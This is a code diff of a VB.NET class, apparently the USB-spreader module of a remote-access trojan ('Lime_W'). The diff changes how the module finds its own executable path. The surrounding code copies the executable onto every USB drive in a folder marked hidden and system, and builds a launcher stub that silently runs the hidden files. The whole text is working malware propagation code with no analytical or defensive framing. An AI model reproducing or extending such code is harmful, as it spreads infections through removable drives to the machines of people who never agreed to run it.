@@ -15,11 +15,13 @@ Public Class USB_SP
     Public Shared Run As New Thread(AddressOf Start, 1)
     Public Shared Assemb As String = "Lime_W"
     Public Shared MyDir As String = "!@"
-    Public Shared MyPath As String = GetFileName(Application.ExecutablePath)
+    Public Shared MyPath As String
+    Public Shared FULLPATH As String
     Public Shared Stub As String = "Imports System.Windows.Forms.Application, System.Diagnostics.Process, System.Reflection" & vbNewLine & "<Assembly: AssemblyCopyright(" & """%C%""" & ")> " & vbNewLine & "Module Nervousness" & vbNewLine & "    Sub Main()" & vbNewLine & "        Try" & vbNewLine & "            Start(StartupPath & " & """\%A%""" & ")" & vbNewLine & "        Catch : End Try" & vbNewLine & "        Try" & vbNewLine & "            Start(StartupPath & " & """\%B%""" & ")" & vbNewLine & "        Catch : End Try" & vbNewLine & "    End Sub" & vbNewLine & "End Module"
 
     Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String)
-
+        FULLPATH = FP
+        MyPath = GetFileName(GetFileName(FULLPATH))
         Try
             If GTV("USB") = Nothing Or GTV("USB") = "Not ready" Then
                 STV("USB", "Waiting USB")
@@ -50,7 +52,7 @@ RE:
                         IO.File.SetAttributes(Drivers.ToString & MyDir, FileAttributes.System + FileAttributes.Hidden)
                     End If
                     If Not File.Exists(Drivers.ToString & MyDir & "\" & MyPath) Then
-                        File.Copy(Application.ExecutablePath, Drivers.ToString & MyDir & "\" & MyPath)
+                        File.Copy(FULLPATH, Drivers.ToString & MyDir & "\" & MyPath)
                         File.SetAttributes(Drivers.ToString & MyDir & "\" & MyPath, FileAttributes.System + FileAttributes.Hidden)
                     End If
                     Call GetTheFile(Drivers.ToString)
